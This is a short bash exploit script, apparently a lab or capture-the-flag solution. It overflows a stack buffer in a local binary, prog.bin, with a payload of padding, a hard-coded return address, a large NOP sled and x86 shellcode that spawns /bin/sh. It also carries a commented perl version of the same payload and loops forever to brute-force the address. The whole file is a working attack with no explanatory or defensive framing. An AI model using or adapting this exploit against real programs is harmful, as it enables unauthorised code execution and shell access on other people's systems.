#!/bin/bash
#0x7ffd07b62598
#$(perl -e 'print("A" x 48 . "\x98\x25\xb6\x07\xfd\x7f" . "\x90" * 20480 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")')
padding=$(printf '%.0sA' {1..48})
returnaddr=$(printf "%b" '\x98\x25\xb6\x07\xfd\x7f')
nopsled=$(printf '%.0s\x90' {1..20480})
shellcode=$(printf "%b" '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80')
exploit="$padding$returnaddr$nopsled$shellcode"
while(true); do
./prog.bin <<EOF
test
$exploit
EOF
done
